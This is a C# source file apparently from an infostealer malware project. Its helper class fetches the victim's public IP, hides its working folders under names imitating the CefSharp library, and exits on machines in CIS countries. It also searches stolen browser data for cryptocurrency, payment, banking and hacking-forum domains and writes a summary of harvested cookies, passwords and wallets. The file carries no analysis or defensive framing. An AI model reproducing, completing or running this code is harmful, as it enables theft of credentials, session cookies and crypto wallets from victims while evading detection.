using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;

namespace SHARP
{
	internal static class Help
	{
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
		public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;
		public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);
		public static string TGdownload = $"C:\\Users\\{Environment.UserName}\\Downloads\\Telegram Desktop";
		public static string Downloads = $"C:\\Users\\{Environment.UserName}\\Downloads";
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
		public static string ExploitDir = LocalData + "\\SCef.WindowsAdapter";
		public static string dir = LocalData + "\\CefSharp.BrowsersSubprocess";
		public static string IP = new WebClient().DownloadString("https://api.ipify.org/");

		public static string GetDomainDetect(string Browser)
		{
			try
			{
				string[] strArray = new string[19]
				{
					"cryptonator.com",
					"payeer.com",
					"lolz.guru",
					"wwh-club.net",
					"xss.is",
					"bhf.io",
					"btc.com",
					"minergate.com",
					"blockchain.com",
					"github.com",
					"coinbase.com",
					"paypal.com",
					"zelenka.guru",
					"lolz.live",
					"binance.com",
					"breachforums.st",
					"youtube.com",
					"sberbank.com",
					"sber.ru"
				};

				FileInfo[] files = new DirectoryInfo(Browser).GetFiles("*.txt", SearchOption.TopDirectoryOnly);
				List<string> stringList = new List<string>();

				foreach (FileInfo fileInfo in files)
					stringList.AddRange(File.ReadAllLines(fileInfo.FullName, Encoding.UTF8));

				HashSet<string> stringSet = new HashSet<string>();

				foreach (string str1 in stringList)
				{
					foreach (string str2 in str1.Split()
						.Select(w => w.Trim())
						.Where(w => w != "")
						.Select(w => w.ToLower())
						.ToList())
					{
						if (!stringSet.Contains(str2))
							stringSet.Add(str2);
					}
				}

				HashSet<string> values = new HashSet<string>();

				foreach (string str3 in strArray)
				{
					foreach (string str4 in stringSet)
					{
						if (str4.Contains(str3) && !values.Contains(str3))
							values.Add(str3);
					}
				}

				return string.Join(", ", values);
			}
			catch (Exception ex)
			{
				return "";
			}
		}

		public static bool CheckSUB(DateTime ConfigDate, DateTime TargetDate)
		{
			return TargetDate < ConfigDate;
		}

		private static void unSNG()
		{
			string country = Counting.country;
			string[] blockedCountries = { "Russia", "Belarus", "Ukraine", "Moldova", "Kazakhstan", "Kyrgyzstan", "Uzbekistan", "Armenia", "Azerbaijan", "Tadjikistan", "Turkmenistan" };

			if (blockedCountries.Contains(country))
				Environment.Exit(0);
		}

		public static void CheckS()
		{
			string markerFile = Path.Combine(LocalData, "CefSharp", "CefSharp_BrowserSubprocess.dat");
			if (File.Exists(markerFile))
				Environment.Exit(0);
		}

		public static void Start()
		{
			CheckS();
			string cefSharpDir = Path.Combine(LocalData, "CefSharp");
			Directory.CreateDirectory(cefSharpDir);
			File.WriteAllText(Path.Combine(cefSharpDir, "CefSharp_BrowserSubprocess.dat"), "-20a");
		}

		public static void Stop()
		{
			string cefSharpDir = Path.Combine(LocalData, "CefSharp");
			if (Directory.Exists(cefSharpDir))
				Directory.Delete(cefSharpDir, true);
		}

		public static void checkSNG()
		{
			if (Config.antiSNG)
				unSNG();
		}

		public static void GetConfigData()
		{
			string configPath = Path.Combine(ExploitDir, "config.json");
			string contents = $@"{{
                ""ip"": ""{IP}"",
                ""country"": ""{Counting.country}"",
                ""cookies"": {Counting.Cookies},
                ""passwords"": {Counting.Passwords},
                ""wallets"": {Counting.Wallets},
                ""name"": ""{Environment.UserName}""
            }}";

			Directory.CreateDirectory(ExploitDir);
			File.WriteAllText(configPath, contents);
		}
	}
}